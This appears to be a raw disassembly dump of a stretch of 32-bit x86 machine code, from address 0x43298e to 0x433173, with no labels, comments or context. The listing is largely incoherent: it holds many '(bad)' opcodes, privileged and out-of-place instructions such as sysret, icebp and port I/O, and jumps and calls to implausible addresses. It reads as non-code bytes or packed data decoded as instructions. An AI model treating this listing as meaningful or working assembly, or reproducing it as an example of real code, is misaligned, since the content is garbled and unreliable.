  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
